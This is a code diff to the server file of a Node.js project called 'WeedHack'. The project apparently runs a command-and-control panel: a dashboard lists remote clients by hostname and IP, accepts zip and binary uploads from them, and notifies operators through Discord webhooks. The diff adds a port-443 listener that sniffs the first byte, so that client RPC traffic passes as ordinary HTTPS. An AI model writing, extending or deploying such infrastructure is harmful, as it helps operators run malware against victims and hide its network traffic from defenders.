@@ -1,5 +1,6 @@
 // language: JavaScript, file: server.js, target: Node 22.5+
-// weedhack — http dashboard on :80, tcp rpc on :443, udp on :880.
+// weedhack — http :80, tls-sniff :443 (https + raw json), udp :880.
+// /api/rpc accepts POSTed JSON RPC from the client (rides inside TLS).
 
 import 'dotenv/config';
 import express from 'express';
@@ -11,11 +12,13 @@ import jwt from 'jsonwebtoken';
 import crypto from 'node:crypto';
 import fs from 'node:fs';
 import http from 'node:http';
+import net from 'node:net';
+import tls from 'node:tls';
 import path from 'node:path';
 import { fileURLToPath } from 'node:url';
 import db, { UPLOAD_DIR } from './db.js';
-import { startTcp, startUdp } from './net.js';
-import { handleTcpLine } from './tcp_rpc.js';
+import { startUdp } from './net.js';
+import { handleRpc, handleTcpLine } from './tcp_rpc.js';
 
 const __dirname  = path.dirname(fileURLToPath(import.meta.url));
 const PUBLIC_DIR = path.join(__dirname, 'public');
@@ -25,6 +28,8 @@ const CFG = {
   tcpPort:    Number(process.env.TCP_PORT  || 443),
   udpPort:    Number(process.env.UDP_PORT  || 880),
   bindHost:   process.env.BIND_HOST || '0.0.0.0',
+  tlsCert:    process.env.TLS_CERT || '',
+  tlsKey:     process.env.TLS_KEY  || '',
   jwtSecret:  process.env.JWT_SECRET || 'dev_only_change_me',
   cookieSecure: process.env.COOKIE_SECURE === 'true',
   maxUpload:  Number(process.env.MAX_UPLOAD_BYTES || 64 * 1024 * 1024),
@@ -34,6 +39,17 @@ if (!fs.existsSync(path.join(PUBLIC_DIR, 'css', 'style.css'))) {
   console.error(`[startup] FATAL: ${PUBLIC_DIR}/css/style.css missing.`);
   process.exit(1);
 }
+if (!fs.existsSync(CFG.tlsCert) || !fs.existsSync(CFG.tlsKey)) {
+  console.error(`[startup] FATAL: TLS cert/key missing.`);
+  console.error(`  cert: ${CFG.tlsCert}`);
+  console.error(`  key : ${CFG.tlsKey}`);
+  process.exit(1);
+}
+
+const tlsContext = tls.createSecureContext({
+  cert: fs.readFileSync(CFG.tlsCert),
+  key:  fs.readFileSync(CFG.tlsKey),
+});
 
 const app = express();
 app.disable('x-powered-by');
@@ -67,10 +83,24 @@ app.use((req, res, next) => {
   next();
 });
 
+// upload route — raw binary body
 app.use('/api/client/upload', express.raw({
   type: ['application/zip', 'application/octet-stream'],
   limit: CFG.maxUpload,
 }));
+
+// rpc route — big json body for base64 uploads
+app.post('/api/rpc', express.json({ limit: Math.ceil(CFG.maxUpload * 1.5) }), (req, res) => {
+  try {
+    const reply = handleRpc(req.body, req.ip);
+    res.json(reply);
+  } catch (e) {
+    console.error('[rpc] error:', e);
+    res.status(500).json({ error: 'rpc error' });
+  }
+});
+
+// everything else — normal small json
 app.use(express.json({ limit: '128kb' }));
 
 const limit = (opts) => rateLimit({ standardHeaders: true, legacyHeaders: false, ...opts });
@@ -141,7 +171,6 @@ app.get('/api/health', (_req, res) => {
   });
 });
 
-// ---------- auth (dashboard, http only) ----------
 app.post('/api/signup', limitAuth, async (req, res) => {
   const { username, email, password, discordWebhook } = req.body || {};
   if (!username || !email || !password || !discordWebhook)
@@ -230,7 +259,6 @@ app.post('/api/webhook/test', requireAuth, limitWebhook, async (req, res) => {
   res.json({ ok: true });
 });
 
-// ---------- dashboard ----------
 app.get('/api/clients', requireAuth, (req, res) => {
   const rows = db.prepare(sql`
     SELECT id, hostname, ip, last_seen FROM clients
@@ -306,25 +334,7 @@ app.use((err, _req, res, _next) => {
   res.status(500).json({ error: 'server error' });
 });
 
-// ---------- listeners ----------
 let udpBound = false;
-
-const tcpServer = startTcp({
-  host: CFG.bindHost,
-  port: CFG.tcpPort,
-  onConn: () => {},
-  onLine: (line, sock) => {
-    if (line.startsWith('{')) {
-      handleTcpLine(line, sock);
-    } else {
-      // legacy text protocol
-      if (line === 'ping') { sock.write('pong\n'); sock.end(); }
-      else if (line === 'who') { sock.write(`you ${sock.remoteAddress}:${sock.remotePort}\n`); sock.end(); }
-      else { sock.write(`echo: ${line}\n`); sock.end(); }
-    }
-  },
-});
-
 const udpSock = startUdp({
   host: CFG.bindHost,
   port: CFG.udpPort,
@@ -335,15 +345,68 @@ const udpSock = startUdp({
 });
 udpSock.on('listening', () => { udpBound = true; });
 
+// port 80 — plain http dashboard
 const httpServer = http.createServer(app);
 httpServer.listen(CFG.httpPort, CFG.bindHost, () => {
   console.log(`[startup] cwd     = ${process.cwd()}`);
   console.log(`[startup] public  = ${PUBLIC_DIR}`);
+  console.log(`[startup] cert    = ${CFG.tlsCert}`);
   console.log('');
   console.log(`WeedHack http up on ${CFG.bindHost}:${CFG.httpPort}`);
-  console.log(`WeedHack tcp  on ${CFG.bindHost}:${CFG.tcpPort}`);
+  console.log(`WeedHack tcp  on ${CFG.bindHost}:${CFG.tcpPort}  (TLS + raw JSON sniffer)`);
   console.log(`WeedHack udp  on ${CFG.bindHost}:${CFG.udpPort}`);
 });
+
+// port 443 — sniff first byte. 0x16 -> TLS. else -> raw JSON line.
+const tlsHttpServer = http.createServer(app);
+
+const router = net.createServer((sock) => {
+  sock.once('data', (first) => {
+    sock.pause();
+    sock.unshift(first);
+
+    if (first[0] === 0x16) {
+      // TLS handshake — wrap and hand to the http server
+      let tlsSock;
+      try {
+        tlsSock = new tls.TLSSocket(sock, {
+          isServer: true,
+          secureContext: tlsContext,
+        });
+      } catch (e) {
+        console.log(`[tls] wrap failed: ${e.message}`);
+        sock.destroy();
+        return;
+      }
+      tlsSock.on('error', (e) => console.log(`[tls] err: ${e.code || e.message}`));
+      tlsHttpServer.emit('connection', tlsSock);
+      sock.resume();
+    } else {
+      // raw JSON line protocol
+      sock.setEncoding('utf8');
+      sock.setTimeout(120_000, () => sock.destroy());
+      let buf = '';
+      sock.on('data', (chunk) => {
+        buf += chunk;
+        let i;
+        while ((i = buf.indexOf('\n')) !== -1) {
+          const line = buf.slice(0, i).trim();
+          buf = buf.slice(i + 1);
+          if (line) handleTcpLine(line, sock, sock.remoteAddress);
+        }
+        if (buf.length > 128 * 1024 * 1024) sock.destroy();
+      });
+      sock.on('error', () => {});
+      sock.resume();
+    }
+  });
+  sock.on('error', () => {});
+});
+
+router.listen(CFG.tcpPort, CFG.bindHost, () => {
+  console.log(`[router] sniffing on ${CFG.bindHost}:${CFG.tcpPort}`);
+});
+router.on('error', (e) => console.error(`[router] err: ${e.message}`));
 
 let shuttingDown = false;
 function shutdown(sig) {
@@ -351,7 +414,7 @@ function shutdown(sig) {
   shuttingDown = true;
   console.log(`\n[shutdown] ${sig}`);
   httpServer.close(() => console.log('[shutdown] http closed'));
-  if (tcpServer.shutdown) tcpServer.shutdown();
+  router.close(() => console.log('[shutdown] router closed'));
   try { udpSock.close(() => console.log('[shutdown] udp closed')); } catch {}
   setTimeout(() => process.exit(0), 3000).unref();
 }
